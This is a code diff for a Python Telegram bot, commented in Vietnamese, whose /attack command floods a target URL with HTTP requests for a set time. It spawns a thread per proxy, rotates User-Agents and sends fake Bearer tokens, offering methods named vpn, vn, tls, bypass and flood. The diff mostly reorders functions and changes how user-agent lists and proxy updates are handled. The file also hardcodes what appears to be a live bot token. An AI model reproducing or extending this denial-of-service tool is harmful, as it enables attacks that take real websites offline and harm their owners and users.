@@ -7,34 +7,10 @@ from telegram import Update
 from telegram.ext.callbackcontext import CallbackContext
 
 # Biến toàn cục
-user_ids = set()
 STATUS = None
 BOT_STATUS = True
 proxies = []
 admin_id = 6081972689
-def load_user_agents():
-    global user_agents
-    try:
-        with open('ua.txt') as f:
-            user_agents = f.read().splitlines()
-        print(f"Đã tải danh sách User-Agent: {len(user_agents)} User-Agent")
-    except FileNotFoundError:
-        print("Không tìm thấy tệp ua.txt. Sử dụng danh sách mặc định")
-vpn_user_agents = [
-    "Shadowrocket/2.1.10 CFNetwork/1220.1 Darwin/20.3.0",
-    "v2rayNG/1.7.20 (Android; Mobile; rv:91.0) Gecko/20100101 Firefox/91.0",
-    "CyberGhost/7.4.1 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
-    "IPVanish/3.0.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-    "PrivateVPN/3.1.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-    "TunnelBear/3.5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
-    "Windscribe/2.3.4 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
-    "HMA/5.5.7 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
-    "SaferVPN/4.0.1 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
-    "VyprVPN/4.2.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-    "Mullvad/2021.8 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
-    "Tor/0.4.5.7 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
-]
-# Đọc proxy từ tệp
 def load_proxies():
     global proxies
     try:
@@ -42,7 +18,27 @@ def load_proxies():
             proxies = f.read().splitlines()
         print("Đã tải danh sách proxy.")
     except FileNotFoundError:
-        print("Không tìm thấy tệp proxy.txt.")
+        print("Không tìm thấy tệp proxy.txt")
+
+
+def load_user_agents():
+    global user_agents
+    try:
+        with open('ua.txt') as f:
+            user_agents = f.read().splitlines()
+        print(f"Đã tải danh sách User-Agent: {len(user_agents)} User-Agent")
+    except FileNotFoundError:
+        print("Không tìm thấy tệp ua.txt Sử dụng danh sách mặc định")
+    
+def update_user_agents(update: Update, context: CallbackContext):
+    if not is_admin(update):
+        update.message.reply_text("Bạn không có quyền thực hiện thao tác này")
+        return
+    file = update.message.document.get_file()
+    file.download("ua.txt")
+    load_user_agents()
+    update.message.reply_text(f"Danh sách User-Agent đã được cập nhật thành công.\nTổng số: {len(user_agents)} User-Agent")
+    
 
 # Random token cho VPN
 def random_token():
@@ -63,16 +59,8 @@ def add_www(url):
             rest = "www." + rest
         return f"{scheme}://{rest}"
     return url
-    
-def update_user_agents(update: Update, context: CallbackContext):
-    if not is_admin(update):
-        update.message.reply_text("Bạn không có quyền thực hiện thao tác này")
-        return
-    file = update.message.document.get_file()
-    file.download("ua.txt")
-    load_user_agents() 
-    update.message.reply_text(f"Danh sách User-Agent đã được cập nhật.\nTổng số: {len(user_agents)} User-Agent.")
 
+# Hàm đếm ngược
 def countdown(s, update, url):
     global STATUS
     STATUS = True
@@ -81,7 +69,7 @@ def countdown(s, update, url):
     STATUS = False
     update.message.reply_text(f"Tấn công {url} đã kết thúc.")
 
-
+# Hàm thực hiện tấn công với một proxy
 def attack_thread(url, proxy, headers, update):
     while STATUS:
         if not BOT_STATUS:
@@ -93,6 +81,8 @@ def attack_thread(url, proxy, headers, update):
         except:
             pass
 
+
+# Hàm tạo luồng tấn công
 def start_attack(url, duration, headers_template, update):
     global STATUS
     threading.Thread(target=countdown, args=(duration, update, url)).start()
@@ -100,9 +90,10 @@ def start_attack(url, duration, headers_template, update):
     for proxy_line in proxies:
         proxy = {'http': 'http://' + proxy_line}
         headers = headers_template.copy()
-        headers['User-Agent'] = choice(user_agents)
+        headers['User-Agent'] = choice(user_agents)  # Sử dụng user_agents thay vì vpn_user_agents
         threading.Thread(target=attack_thread, args=(url, proxy, headers, update)).start()
 
+# Hàm tấn công VPN
 def vpn_attack(url, duration, update):
     headers_template = {
         'Authorization': f"Bearer {random_token()}",
@@ -159,11 +150,24 @@ def start_bot(update: Update, context: CallbackContext):
 def stop_bot(update: Update, context: CallbackContext):
     global BOT_STATUS
     if not is_admin(update):
-        update.message.reply_text("Bạn không có quyền thực hiện thao tác này.")
+        update.message.reply_text("Bạn không có quyền thực hiện thao tác này")
         return
     BOT_STATUS = False
     update.message.reply_text("Bot đã tắt")
+def help_command(update: Update, context: CallbackContext):
+    help_text = """
+Danh sách các lệnh:
+- /start: Hiển thị danh sách lệnh
+- /help: Hiển thị danh sách lệnh
+- /attack <method> <url> <time>: Tấn công với phương thức và thời gian
+    + method: vpn, vn, tls, bypass, flood
+"""
+    update.message.reply_text(help_text)
 
+# Lệnh start
+def start_command(update: Update, context: CallbackContext):
+    update.message.reply_text("Chào mừng bạn đến với bot! Sử dụng /help để xem danh sách các lệnh")
+    
 # Lệnh xử lý /tang
 def tang(update, context):
     global BOT_STATUS
@@ -193,24 +197,8 @@ def tang(update, context):
             update.message.reply_text("method không hợp lệ")
     except (IndexError, ValueError):
         update.message.reply_text("Sai cú pháp. Sử dụng: /attack <method> <url> <time>")
-        
-def help_command(update: Update, context: CallbackContext):
-    help_text = """
-Danh sách các lệnh:
-- /start: Hiển thị danh sách lệnh
-- /help: Hiển thị danh sách lệnh
-- /attack <method> <url> <time>: Tấn công với phương thức và thời gian
-    + method: vpn, vn, tls, bypass, flood
-"""
-    update.message.reply_text(help_text)
-    
-def start_command(update: Update, context: CallbackContext):
-    update.message.reply_text("Chào mừng bạn đến với bot! Sử dụng /help để xem danh sách các lệnh")
-    
-def track_user(update: Update, context: CallbackContext):
-    global user_ids
-    user_ids.add(update.effective_chat.id)
 
+# Hàm cập nhật proxy từ tệp
 def update_proxy(update: Update, context: CallbackContext):
     global proxies
     if not is_admin(update):
@@ -222,20 +210,13 @@ def update_proxy(update: Update, context: CallbackContext):
     proxy_count = len(proxies)
     from datetime import datetime
     time_updated = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-
-    # Gửi tin nhắn tới admin xác nhận
-    update.message.reply_text(
-        f"Danh sách proxy đã được cập nhật thành công. Hiện có {proxy_count} proxy"
+    update.message.reply_text(f"Danh sách proxy đã được cập nhật thành công. Hiện có {proxy_count} proxy")
+    
+    context.bot.send_message(
+        chat_id=update.effective_chat.id,
+        text=f"Bot đã cập nhật lại danh sách proxy vào lúc {time_updated}\nSố lượng proxy: {proxy_count}"
     )
 
-    for user_id in user_ids:
-        try:
-            context.bot.send_message(
-                chat_id=user_id,
-                text=f"Bot đã cập nhật lại danh sách proxy vào lúc {time_updated}\nSố lượng proxy: {proxy_count}"
-            )
-        except Exception as e:
-            print(f"Không thể gửi tin nhắn tới {user_id}: {e}")
 # Hàm chính
 def main():
     TOKEN = '8178485363:AAGzYzstr-C6Gj9A8sR2MguA70f5wPFg6Q0'
@@ -245,13 +226,12 @@ def main():
     dp.add_handler(CommandHandler("on", start_bot))
     dp.add_handler(CommandHandler("off", stop_bot))
     dp.add_handler(CommandHandler("attack", tang))
-    dp.add_handler(CommandHandler("help", help_command))
     dp.add_handler(CommandHandler("start", start_command))
+    dp.add_handler(CommandHandler("help", help_command))
+    dp.add_handler(CommandHandler("setuseragents", update_user_agents))
     dp.add_handler(MessageHandler(Filters.document, update_proxy))
-    dp.add_handler(MessageHandler(Filters.document, update_user_agents))
-    dp.add_handler(MessageHandler(Filters.all, track_user))
     updater.start_polling()
     updater.idle()
 
 if __name__ == '__main__':
-    main() 
+    main()
